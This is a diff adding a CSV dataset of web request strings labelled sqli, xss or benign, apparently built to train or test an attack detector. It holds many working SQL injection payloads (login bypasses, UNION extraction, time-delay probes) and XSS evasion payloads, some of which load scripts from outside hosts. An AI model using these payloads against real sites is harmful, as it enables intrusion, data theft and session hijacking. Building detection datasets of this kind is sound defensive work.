@@ -1,0 +1,1848 @@
+﻿payload,type
+admin' or 1=1,sqli
+"<script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(1)}),x</script>",xss
+"<object id=""x"" classid=""clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598""></object> <object classid=""clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B"" onqt_error=""javascript:alert(1)"" style=""behavior:url(#x);""><param name=postdomevents /></object>",xss
+a' order by 9999--,sqli
+miembros/imagenes/ogono.jpg,benign
+"<a href=""\xE2\x80\x81javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+" <script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script ​​​​​​​​​​​​",xss
+"svUEv: select * from users where id=1 or 1#""@ union select null,version() -- 1",sqli
+miembros/imagenes/ogono.jpg,benign
+1'; waitfor delay '0:0:X'--,sqli
+"<div id=d><x xmlns=""><iframe onload=javascript:alert(1)""></div> <script>d.innerHTML=d.innerHTML</script>",xss
+"<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>",xss
+admin') or ('1'='1'#,sqli
+"UE1kn: select * from users where id=1 union select 1,banner from v$version where rownum=1 -- 1",sqli
+"s1: select * from users where id=1 or ""1,"" or 1=1 -- 1",sqli
+"s?{s: select * from users where id=1 or ""]{"" or 1=1 -- 1",sqli
+"s?UEf: select * from users where id=1 or 1#""? union select version(),version() -- 1",sqli
+"<img\x10src=x onerror=""javascript:alert(1)"">",xss
+"<a href=""\xE3\x80\x80javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+"<script\x09type=""text/javascript"">javascript:alert(1);</script>",xss
+"s?v: select * from users where id=1 or ""?@"" or 1=1 -- 1",sqli
+"<math><a xlink:href=""//jsfiddle.net/t846h/"">click",xss
+a' and '456'='678,sqli
+"<script\x0Atype=""text/javascript"">javascript:alert(1);</script>",xss
+<embed src=%(jscript)s></embed>,xss
+"s.{s: select * from users where id=1 or "".{"" or 1=1 -- 1",sqli
+"oUEvc: select * from users where id=1 *\ union select null,@@VERSION -- 1",sqli
+miembros/index.jsp,benign
+"<a href=""javascript:javascript:alert(1)""><event-source src=""data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A"">",xss
+"`""'><img src=xxx:x \x27onerror=javascript:alert(1)>",xss
+&.o&1: select * from users where id=1 or \.<\ or 1=1 -- 1,sqli
+&1c: select * from users where id=1   or 1=1 -- 1,sqli
+99eja36r9a,benign
+"""><img src=x onerror=window.open('https://www.google.com/');>",xss
+"<a href=""\x20javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+nagaraja,benign
+spencer,benign
+<script>%(payload)s</script>,xss
+'&',sqli
+"s1:s: select * from users where id=1 or ""1:"" or 1=1 -- 1",sqli
+soo&1: select * from users where id='1' + $+%\ or 1=1 -- 1',sqli
+55265136t,benign
+imagenes/2.gif,benign
+"`""'><img src=xxx:x onerror\x0D=javascript:alert(1)>",xss
+<script x> alert(1) </script 1=2,xss
+a'or/*d*/345=345--,sqli
+"<input/onmouseover=""javaSCRIPT&colon;confirm&lpar;1&rpar;""",xss
+"s{UEs: select * from users where id=1 or 1#""{ union select 'a',version() -- 1",sqli
+<img src ?itworksonchrome?\/onerror = alert(1)​​​,xss
+s&on&: select * from users where id='1' or \<$ or 1=1 -- 1',sqli
+"<event-source src=""%(event)s"" onload=""javascript:alert(1)"">",xss
+"s?;s: select * from users where id=1 or ""?;"" or 1=1 -- 1",sqli
+imagenes/2.gif,benign
+"s:UEs: select * from users where id=1 or 1#"": union select 'a',version() -- 1",sqli
+9869,benign
+"UE1s: select * from users where id=1 union select 1 $$,version() -- 1",sqli
+"sv?s: select * from users where id=1 or ""@?"" or 1=1 -- 1",sqli
+"a"" or ""345""=""345",sqli
+"ABC<div style=""x:\xE2\x80\x8Bexpression(javascript:alert(1)"">DEF",xss
+"<bgsound onPropertyChange bgsound onPropertyChange=""javascript:javascript:alert(1)""></bgsound onPropertyChange>",xss
+publico/vaciar.jsp?B2=Vaciar+carrito,benign
+o.&1c: select * from users where id=1 <@. or 1=1 -- 1,sqli
+"sn{s: select * from users where id=1 or ""_{"" or 1=1 -- 1",sqli
+global/titulo.jsp,benign
+"sUEnv: select * from users where id='1' union select $*$,@@VERSION -- 1'",sqli
+"1o)UE: select * from users where id=1 + (\+) union select null,@@VERSION -- 1",sqli
+"s;ns: select * from users where id=1 or "";_"" or 1=1 -- 1",sqli
+"<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:javascript:alert(1);"">",xss
+8.22E+15,benign
+"`""'><img src=xxx:x \x0Aonerror=javascript:alert(1)>",xss
+4s2cu8e44,benign
+cotner,benign
+&o.&1: select * from users where id=1 or \<\. or 1=1 -- 1,sqli
+"s&(1): select * from users where id='1' or (1)=1 union select 1,banner from v$version where rownum=1 -- 1'",sqli
+<video poster=javascript:javascript:alert(1)//,xss
+o(v)&: select * from users where id=1 %(@) or 1=1 -- 1,sqli
+"<img\x47src=x onerror=""javascript:alert(1)"">",xss
+miembros/index.jsp,benign
+"<meta content=""&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)"" http-equiv=""refresh""/>",xss
+"1o.UE: select * from users where id=1 +\+. union select null,@@VERSION -- 1",sqli
+http://www.<script>alert(1)</script .com,xss
+<!--[if gte IE 4]><SCRIPT>javascript:alert(1);</SCRIPT><![endif]-->,xss
+--><!-- --\x3E> <img src=xxx:x onerror=javascript:alert(1)> -->,xss
+"""`'><script>\xEF\xBF\xBEjavascript:alert(1)</script>",xss
+<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:javascript:alert(1)></OBJECT>,xss
+"s:)s: select * from users where id=1 or "":)""=1 or 1=1 -- 1",sqli
+"<img \x47src=x onerror=""javascript:alert(1)"">",xss
+a' or 'dfth'='dfth'--,sqli
+"<a href=""\xE2\x80\x89javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+"<img src=x onerror=\x09""javascript:alert(1)"">",xss
+"1')) or benchmark(100000000,MD5(1))#",sqli
+swearing,benign
+"<div style=""list-style:url(http://foo.f)\20url(javascript:javascript:alert(1));"">X",xss
+"o.UEf: select * from users where id=1  <@. union select version(),version() -- 1",sqli
+"<script\x2Ftype=""text/javascript"">javascript:alert(1);</script>",xss
+"ABC<div style=""x:\xE2\x80\x86expression(javascript:alert(1)"">DEF",xss
+"<svg onResize svg onResize=""javascript:javascript:alert(1)""></svg onResize>",xss
+capaz9,benign
+"<IMG SRC=""livescript:[code]"">",xss
+"<a style=""-o-link:'javascript:javascript:alert(1)';-o-link-source:current"">X",xss
+"sUEo1: select * from users where id='1' union select !<1,version() -- 1'",sqli
+dagmar,benign
+"s:v: select * from users where id=1 or "":@"" or 1=1 -- 1",sqli
+publico/entrar.jsp?errorMsg=Credenciales+incorrectas,benign
+"so()U: select * from users where id='1' + (\) union select 1,@@VERSION -- 1'",sqli
+"ABC<div style=""x:exp\x5Cression(javascript:alert(1)"">DEF",xss
+"s?o1U: select * from users where id=1 or 1#""?=1 union select 1,version() -- 1",sqli
+"UEvf(: select * from users where id=1 union select @<@$,version() -- 1",sqli
+"`""'><img src=xxx:x \x22onerror=javascript:alert(1)>",xss
+"<IMG SRC=# onmouseover=""alert('xxs')"">",xss
+"""`'><script>\xE1\x9A\x80javascript:alert(1)</script>",xss
+"<meta charset=""x-imap4-modified-utf7"">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi",xss
+<script>javascript:alert(1)</script\x0A,xss
+"""`'><script>\xE2\x80\x89javascript:alert(1)</script>",xss
+1; waitfor delay '0:0:X'--,sqli
+imagenes/1.gif,benign
+"<iframe srcdoc=""&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(1)&amp;gt;>"">",xss
+patchsqa,benign
+miembros/imagenes/zarauz.jpg,benign
+"noUEv: select * from users where id=1 +$+ union select null,@@VERSION -- 1",sqli
+<!--[if<img src=x onerror=javascript:alert(1)//]> -->,xss
+"<XSS STYLE=""behavior: url(%(htc)s);"">",xss
+"</ foo=""><script>javascript:alert(1)</script>"">",xss
+imagenes/logo.gif,benign
+5150,benign
+"&noUE: select * from users where id=1 or $<\ union select 1,@@VERSION -- 1",sqli
+//|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\,xss
+"<a href=""data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>"">X</a",xss
+"&1UE1: select * from users where id=1 ||1 union select 1,banner from v$version where rownum=1 -- 1",sqli
+"<div style=""font-family:'foo&#10;;color:red;';"">XXX",xss
+".ovUE: select * from users where id=1.%@ union select 1,version() -- 1",sqli
+"<div style=""background:url(/f#&#127;oo/;color:red/*/foo.jpg);"">X",xss
+"s(n: select * from users where id=1 or ""(["" or 1=1 -- 1",sqli
+publico/registro.jsp?modo=registro&login=haralamb&password=PO2546OtO4&nombre=Amancio&apellidos=Daya+Basulto&email=gila-berova%40artforall.mm&dni=06314426Y&direccion=C%2F+Plza.+18%2C+6-E&ciudad=Chimillas&cp=19144&provincia=C%E1ceres&ntc=6002328199807748&B1=Registrar,benign
+a' or '345'='345,sqli
+miembros/salir.jsp,benign
+"<a href=""\xE1\xA0\x8Ejavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+publico/miembros.jsp,benign
+miembros/fotos.jsp,benign
+index.jsp,benign
+"sUEo\: select * from users where id='1' union select +\#,@@VERSION -- 1'",sqli
+"""`'><script>\x0Cjavascript:alert(1)</script>",xss
+wanda,benign
+"ABC<div style=""x:\xE3\x80\x80expression(javascript:alert(1)"">DEF",xss
+<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/,xss
+"ABC<div style=""x:exp\x00ression(javascript:alert(1)"">DEF",xss
+"s{o1&: select * from users where id=1 or @#""{=1 or 1=1 -- 1",sqli
+"&.onU: select * from users where id=1 or \.<$ union select 1,@@VERSION -- 1",sqli
+1437,benign
+"s:1s: select * from users where id=1 or "":1"" or 1=1 -- 1",sqli
+<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>',xss
+"""`'><script>\xE2\x80\xAFjavascript:alert(1)</script>",xss
+"`""'><img src=xxx:x onerror\x09=javascript:alert(1)>",xss
+<iframe src=http://ha.ckers.org/scriptlet.html <,xss
+imagenes/logo.gif,benign
+"ABC<div style=""x:\x0Bexpression(javascript:alert(1)"">DEF",xss
+"s?&1c: select * from users where id=1 or 1#""? or 1=1 -- 1",sqli
+"<IMG SRC=""javascript:alert('XSS');"">",xss
+"&v: select * from users where id=1 or @`\` union select 1,version() -- 1",sqli
+48042322z,benign
+"s;n: select * from users where id=1 or "";["" or 1=1 -- 1",sqli
+"&o1UE: select * from users where id=1 or \<1 union select 1,@@VERSION -- 1",sqli
+publico/caracteristicas.jsp?id=1,benign
+"n1UEv: select * from users where id=1 +$ 1 union select null,@@VERSION -- 1",sqli
+"s&noo: select * from users where id='1' or $+<$ union select 1,@@VERSION -- 1'",sqli
+"s.c: select * from users where id=1 or "".#"" or 1=1 -- 1",sqli
+publico/caracteristicas.jsp?id=2,benign
+--><!-- --\x21> <img src=xxx:x onerror=javascript:alert(1)> -->,xss
+karlweiss@barnicesuv.gov,benign
+<BODY ONLOAD=javascript:alert(1)>,xss
+"s?,vc: select * from users where id='1' union select $[""],@@VERSION -- 1'",sqli
+1oo1&: select * from users where id=1 + \+%1 or 1=1 -- 1,sqli
+hao,benign
+publico/miembros.jsp,benign
+6660,benign
+"s?UEv: select * from users where id=1 or 1#""? union select null,version() -- 1",sqli
+<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(javascript:alert(1))}</style>,xss
+guadiana 149 6f,benign
+"<embed src=""javascript:alert(1)"">",xss
+"<img src=1 href=1 onerror=""javascript:alert(1)""></img>",xss
+"<IMG SRC=""javascript:javascript:alert(1);"">",xss
+<script language='javascript' src='%(jscript)s'></script>,xss
+"<img src\x00=x onerror=""javascript:alert(1)"">",xss
+<script\x20>javascript:alert(1)</script>,xss
+.o1&1: select * from users where id=1.*1 or 1=1 -- 1,sqli
+miembros/fotos.jsp,benign
+"<STYLE>li {list-style-image: url(""javascript:alert('XSS')"");}</STYLE><UL><LI>XSS</br>",xss
+"admin"" or ""1""=""1""#",sqli
+"<html onMouseLeave html onMouseLeave=""javascript:javascript:alert(1)""></html onMouseLeave>",xss
+"<a/href=""javascript:&#13; javascript:prompt(1)""><input type=""X"">",xss
+miembros/index.jsp,benign
+"<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">",xss
+"snUE1: select * from users where id=1 or 1#""$ union select 1,version() -- 1",sqli
+"""`'><script>\xE2\x80\x82javascript:alert(1)</script>",xss
+sevilla,benign
+a' order by 1-- #,sqli
+c/ arco de veronicas s/n 4e,benign
+"'`""><\x00script>javascript:alert(1)</script>",xss
+publico/pagar.jsp?modo=insertar&precio=7537&B1=Confirmar,benign
+"<TABLE><TD BACKGROUND=""javascript:alert('XSS')"">",xss
+"<a href=""javas\x02cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+"ABC<div style=""x:\x00expression(javascript:alert(1)"">DEF",xss
+dalmau,benign
+imagenes/cmenbul.gif,benign
+"&1oo1: select * from users where id=1 or  1<@=1 union select 1,version() -- 1",sqli
+"<img src=x\x13onerror=""javascript:alert(1)"">",xss
+casasola de arin,benign
+miembros/index.jsp,benign
+6477,benign
+&,sqli
+<svg/onload=alert(1),xss
+<sVg><scRipt %00>alert&lpar;1&rpar; {Opera},xss
+"<XML ID=I><X><C><![CDATA[<IMG SRC=""javas]]<![CDATA[cript:javascript:alert(1);"">]]</C><X></xml>",xss
+"sUE.o: select * from users where id='1' union select \.%1,@@VERSION -- 1'",sqli
+publico/registro.jsp?modo=registro&login=blanchet&password=recital&nombre=Filem%F3n&apellidos=Ditte+Pallar%E8s&email=moston%40sierradealcaraz.sg&dni=21096784B&direccion=Calle+Miquel+Santandreu+66%2C+&ciudad=Valderredible&cp=04878&provincia=Le%F3n&ntc=1764884801392734&B1=Registrar,benign
+miembros/fotos.jsp,benign
+"s),s: select * from users where id=1 or ""),"" or 1=1 -- 1",sqli
+ribamontn al mar,benign
+<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>,xss
+"""`'><script>\xE2\x80\x80javascript:alert(1)</script>",xss
+"s,o1&: select * from users where id=1 or 1#"",=1 or 1=1 -- 1",sqli
+"guardia, la",benign
+"<html onMouseOut html onMouseOut=""javascript:javascript:alert(1)""></html onMouseOut>",xss
+<SCRIPT onreadystatechange=javascript:javascript:alert(1);></SCRIPT>,xss
+19140,benign
+"so.nU: select * from users where id='1' <@._ union select 1,version() -- 1'",sqli
+"exp/*<A STYLE='no\xss:noxss(""*//*"");xss:ex/*XSS*//*/*/pression(alert(""XSS""))'>",xss
+"<script src=""data:\xCB\x8F,javascript:alert(1)""></script>",xss
+index.jsp,benign
+&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera},xss
+"&1ooU: select * from users where id=1 or \+<\ union select 1,@@VERSION -- 1",sqli
+"""/><img/onerror=\x09javascript:alert(1)\x09src=xxx:x />",xss
+"admin""/*",sqli
+"<style><img src=""</style><img src=x onerror=javascript:alert(1)//"">",xss
+global/menum.jsp,benign
+".o.UE: select * from users where id=1.<@. union select 1,version() -- 1",sqli
+publico/carrito.jsp,benign
+"s: select * from users where id='1' or """"<@ union select 1,version() -- 1'",sqli
+"<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>",xss
+"<a href=""\xE2\x80\x8Ajavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+"UE1&1: select * from users where id=1 union select 1||1,version() -- 1",sqli
+imagenes/cmenbul.gif,benign
+"<a href=""\x08javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+<svg><script onlypossibleinopera:-)> alert(1),xss
+"<SCRIPT SRC=""http://ha.ckers.org/xss.jpg""></SCRIPT>",xss
+global/menum.jsp,benign
+imagenes/2.gif,benign
+"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:javascript:alert(1);"">",xss
+"UEvs: select * from users where id=1 union select @ $$,version() -- 1",sqli
+"sovvU: select * from users where id='1' + @ @1 union select 1,version() -- 1'",sqli
+Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser,xss
+"no.UE: select * from users where id=1 +$+. union select null,@@VERSION -- 1",sqli
+"<a href=""\x15javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+"s&v1U: select * from users where id='1' or @ 1=1 union select 1,version() -- 1'",sqli
+"<math href=""javascript:javascript:alert(1)"">CLICKME</math>  <math> <maction actiontype=""statusline#http://google.com"" xlink:href=""javascript:javascript:alert(1)"">CLICKME</maction> </math>",xss
+28221877a,benign
+' or ''-',sqli
+"UE1nc: select * from users where id=1 union select 1a#,banner from v$version where rownum=1 -- 1",sqli
+admin' #,sqli
+"<a href=""\xC2\xA0javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+"""`'><script>\xE2\x80\x88javascript:alert(1)</script>",xss
+admin' --,sqli
+tenuta,benign
+"<BGSOUND SRC=""javascript:alert('XSS');"">",xss
+"s(UEf: select * from users where id=1 or 1#""( union select version(),version() -- 1",sqli
+"<script\x2Ftype=""text/javascript"">javascript:alert(1);</script>",xss
+<IMG SRC=&{javascript:alert(1);};>,xss
+"<script charset=""\x22>javascript:alert(1)</script>",xss
+"&ovUE: select * from users where id=1 or !<@ union select 1,version() -- 1",sqli
+"<INPUT TYPE=""IMAGE"" SRC=""javascript:javascript:alert(1);"">",xss
+"`""'><img src=xxx:x \x00onerror=javascript:alert(1)>",xss
+"<script onLoad script onLoad=""javascript:javascript:alert(1)""></script onLoad>",xss
+"<img src=x onerror=\x00""javascript:alert(1)"">",xss
+"s.?s: select * from users where id=1 or "".]"" or 1=1 -- 1",sqli
+"<embed width=500 height=500 code=""data:text/html,<script>%(payload)s</script>""></embed>",xss
+"<script\x3Etype=""text/javascript"">javascript:alert(1);</script>",xss
+"<script src=""data:\xD4\x8F,javascript:alert(1)""></script>",xss
+"<a href=""\x13javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+"<meta http-equiv=""refresh"" content=""0;javascript&colon;alert(1)""/>​",xss
+"<html onMouseDown html onMouseDown=""javascript:javascript:alert(1)""></html onMouseDown>",xss
+"<img \x00src=x onerror=""alert(1)"">",xss
+miembros/editar.jsp?modo=registro&login=padraic&password=-se331rio&nombre=Yuvia&apellidos=Escogido+Francesc&email=challee%40zonamodelos.co&dni=02933716C&direccion=Cami+Son+Anglada%2C+S%2FN+&ciudad=Lagata&cp=31382&provincia=Navarra&ntc=0777026292170424&B1=Registrar,benign
+glyn7,benign
+"<iframe src iframe src=""javascript:javascript:alert(1)""></iframe src>",xss
+"<a href=""javascript\x3Ajavascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+imagenes/nuestratierra.jpg,benign
+s&n1&: select * from users where id='1' or $ 1=1 or 1=1 -- 1',sqli
+onn&1: select * from users where id=1 <@$_ or 1=1 -- 1,sqli
+"<a href=""javascript:void(0)"" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>",xss
+lamarr@tardos.mobi,benign
+publico/miembros.jsp,benign
+<style onreadystatechange=javascript:javascript:alert(1);></style>,xss
+"<A HREF=""http://1113982867/"">XSS</A>",xss
+"""`'><script>\xEF\xBF\xAEjavascript:alert(1)</script>",xss
+"s&onU: select * from users where id='1' or \<$ union select 1,@@VERSION -- 1'",sqli
+publico/productos.jsp,benign
+"ABC<div style=""x:\xE2\x80\x85expression(javascript:alert(1)"">DEF",xss
+1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>,xss
+"svc: select * from users where id=1 or ""@#"" or 1=1 -- 1",sqli
+<body oninput=javascript:alert(1)><input autofocus>,xss
+"<script\x0Ctype=""text/javascript"">javascript:alert(1);</script>",xss
+"&n1UE: select * from users where id=1 or $ 1=1 union select 1,@@VERSION -- 1",sqli
+"s)(s: select * from users where id=1 or "")(""=1 or 1=1 -- 1",sqli
+"&.o1U: select * from users where id=1 or \.<1 union select 1,@@VERSION -- 1",sqli
+o(n)&: select * from users where id=1 %($) or 1=1 -- 1,sqli
+"<svg onload svg onload=""javascript:javascript:alert(1)""></svg onload>",xss
+o..&1: select * from users where id=1 <@.. or 1=1 -- 1,sqli
+imagenes/cmenbul.gif,benign
+admin' or 1=1/*,sqli
+&(1&1: select * from users where id=1 or (\+)=1 or 1=1 -- 1,sqli
+"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--",xss
+.ov&1: select * from users where id=1.%@ or 1=1 -- 1,sqli
+<frameset onload=javascript:javascript:alert(1)></frameset>,xss
+carmelo,benign
+"s);s: select * from users where id=1 or "");"" or 1=1 -- 1",sqli
+"<div id=""x"">XXX</div> <style>  #x{font-family:foo[bar;color:green;}  #y];color:red;{}  </style>",xss
+"admin"" --",sqli
+revelante,benign
+de_la,benign
+imagenes/logo.gif,benign
+"<!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'""-->",xss
+"<a href=""\x00javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1),xss
+"sUE\c: select * from users where id='1' union select \#,@@VERSION -- 1'",sqli
+07608453f,benign
+imagenes/1.gif,benign
+"&oUEv: select * from users where id=1 or \<\ union select null,@@VERSION -- 1",sqli
+1'); waitfor delay '0:0:X'--,sqli
+".oUEf: select * from users where id=1. <@ union select version(),version() -- 1",sqli
+admin'or 1=1 or ''=',sqli
+"""/><img/onerror=\x22javascript:alert(1)\x22src=xxx:x />",xss
+imagenes/3.gif,benign
+imagenes/1.gif,benign
+publico/autenticar.jsp?modo=entrar&login=utilla&pwd=33s4h9929r&remember=off&B1=Entrar,benign
+"<IMG SRC=""jav    ascript:alert('XSS');"">",xss
+"<a href=""\x11javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+"a""or/*g*/345=345-- #",sqli
+"so:s: select * from users where id=1 or ""&:"" or 1=1 -- 1",sqli
+3.40E+15,benign
+a'and/*d*/456=678--,sqli
+"o1c: select * from users where id=1 <1## union select 1,version() -- 1",sqli
+imagenes/2.gif,benign
+"<a href=""\x0Fjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+"sov1U: select * from users where id='1' + @ 1 union select 1,version() -- 1'",sqli
+"<BODY onload!#$%%&()*~+-_.,:;?@[/|\]^`=javascript:alert(1)>",xss
+soov&: select * from users where id='1' <@&@ or 1=1 -- 1',sqli
+"s;?s: select * from users where id=1 or "";]"" or 1=1 -- 1",sqli
+<img src=`xx:xx`onerror=alert(1)>,xss
+global/creditos.jsp,benign
+<IMG SRC=javascript:javascript:alert(1)>,xss
+"soo1U: select * from users where id='1' <@&1 union select 1,version() -- 1'",sqli
+"<SCRIPT ""a='>'"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
+" or ""-",sqli
+"UEvnn: select * from users where id=1 union select @ $_,version() -- 1",sqli
+"<img \x47src=x onerror=""javascript:alert(1)"">",xss
+"&(nUE: select * from users where id=1 or ($+)=1 union select 1,@@VERSION -- 1",sqli
+"`""'><img src=xxx:x onerror\x0C=javascript:alert(1)>",xss
+index.jsp,benign
+&on&1: select * from users where id=1 or \<$ or 1=1 -- 1,sqli
+prado de la guzpea,benign
+" or ""^",sqli
+global/creditos.jsp,benign
+"a"" and ""fghi""=""fghj""-- #",sqli
+"<img src=x\x10onerror=""javascript:alert(1)"">",xss
+"s:,s: select * from users where id=1 or "":,"" or 1=1 -- 1",sqli
+"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:alert('XSS');"">",xss
+"UEv11: select * from users where id=1 union select @ 1$,version() -- 1",sqli
+"<TABLE><TD BACKGROUND=""javascript:javascript:alert(1)"">",xss
+1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:alert(1)&gt;`>,xss
+vital,benign
+45681,benign
+"1) or benchmark(100000000,MD5(1))#",sqli
+"<TABLE BACKGROUND=""javascript:javascript:alert(1)"">",xss
+"so)s: select * from users where id=1 or ""&)"" or 1=1 -- 1",sqli
+"s&v(1: select * from users where id='1' or @(1)=1 union select 1,version() -- 1'",sqli
+"ABC<div style=""x:\x0Aexpression(javascript:alert(1)"">DEF",xss
+publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=39&cantidad=31&B1=A%F1adir+al+carrito,benign
+' or ''&',sqli
+"cami son anglada, s/n",benign
+"o(1)U: select * from users where id=1 *(1) union select 1,banner from v$version where rownum=1 -- 1",sqli
+"s:.s: select * from users where id=1 or "":.""=1 or 1=1 -- 1",sqli
+"<object onError object onError=""javascript:javascript:alert(1)""></object onError>",xss
+"<body onPageHide body onPageHide=""javascript:javascript:alert(1)""></body onPageHide>",xss
+"s{(s: select * from users where id=1 or ""{(""=1 or 1=1 -- 1",sqli
+oo1&1: select * from users where id=1 %!<1 or 1=1 -- 1,sqli
+global/creditos.jsp,benign
+imagenes/nuestratierra.jpg,benign
+<input onfocus=javascript:alert(1) autofocus>,xss
+"sn;s: select * from users where id=1 or ""_;"" or 1=1 -- 1",sqli
+"<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>",xss
+s&ov&: select * from users where id='1' or !<@ or 1=1 -- 1',sqli
+"""`'><script>\xE2\x80\x8Bjavascript:alert(1)</script>",xss
+"<iframe onload iframe onload=""javascript:javascript:alert(1)""></iframe onload>",xss
+chicon merlo,benign
+"<![><img src=""]><img src=x onerror=javascript:alert(1)//"">",xss
+"soovU: select * from users where id='1' %!<@ union select 1,version() -- 1'",sqli
+miembros/salir.jsp,benign
+imagenes/cmenbul.gif,benign
+"so1s: select * from users where id=1 or ""%1"" or 1=1 -- 1",sqli
+"<a href=""\x1Cjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+publico/vaciar.jsp?B2=Vaciar+carrito,benign
+"<P STYLE=""behavior:url('#default#time2')"" end=""0"" onEnd=""javascript:alert(1)"">",xss
+"sv;s: select * from users where id=1 or ""@;""=1 or 1=1 -- 1",sqli
+93289880v,benign
+trobos 39 4e,benign
+"s&oUE: select * from users where id='1' or \<\ union select 1,@@VERSION -- 1'",sqli
+"&#00;</form><input type&#61;""date"" onfocus=""alert(1)"">",xss
+"""'`><p><svg><script>a='hello\x27;javascript:alert(1)//';</script></p>",xss
+"<? foo=""><x foo='?><script>javascript:alert(1)</script>'>"">",xss
+"<img \x34src=x onerror=""javascript:alert(1)"">",xss
+"<a href=""data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>"">X</a",xss
+.)&1c: select * from users where id=1 + (\.) or 1=1 -- 1,sqli
+publico/registro.jsp?modo=registro&login=gwenny&password=BOCana%24da&nombre=Danimiro&apellidos=Prosd%F3cimo+Surinyac&email=maren-bufford4%40fruteriacartaya.yu&dni=04212893Y&direccion=C%2F+Galicia%2C+180%2C+&ciudad=Robleda&cp=06440&provincia=C%F3rdoba&ntc=1856004857366548&B1=Registrar,benign
+desiree,benign
+"s?UEs: select * from users where id=1 or 1#""? union select 'a',version() -- 1",sqli
+"ABC<div style=""x:expression\x5C(javascript:alert(1)"">DEF",xss
+"snUEf: select * from users where id=1 or 1#""$ union select version(),version() -- 1",sqli
+miembros/fotos.jsp,benign
+"s:;s: select * from users where id=1 or "":;""=1 or 1=1 -- 1",sqli
+<script\x0A>javascript:alert(1)</script>,xss
+"<iframe onLoad iframe onLoad=""javascript:javascript:alert(1)""></iframe onLoad>",xss
+"UEvo.: select * from users where id=1 union select @<@.,version() -- 1",sqli
+publico/productos.jsp,benign
+</plaintext\></|\><plaintext/onmouseover=prompt(1),xss
+"so?s: select * from users where id=1 or ""%?"" or 1=1 -- 1",sqli
+"<SCRIPT a="">"" '' SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
+"1')) or benchmark(100000000,MD5(1))#",sqli
+"a"" order by 1-- #",sqli
+http://www.google<script .com>alert(document.location)</script,xss
+<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>,xss
+"<DIV STYLE=""width:expression(javascript:alert(1));"">",xss
+¼script¾alert(¢XSS¢)¼/script¾,xss
+"<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script> ​",xss
+"`""'><img src=xxx:x \x2Fonerror=javascript:alert(1)>",xss
+"s)ns: select * from users where id=1 or "")$"" or 1=1 -- 1",sqli
+"1) or benchmark(100000000,MD5(1))#",sqli
+1oon&: select * from users where id=1 + \+%$ or 1=1 -- 1,sqli
+<BODY ONLOAD=javascript:javascript:alert(1)>,xss
+noo1&: select * from users where id=1 + $+%1 or 1=1 -- 1,sqli
+armenteros,benign
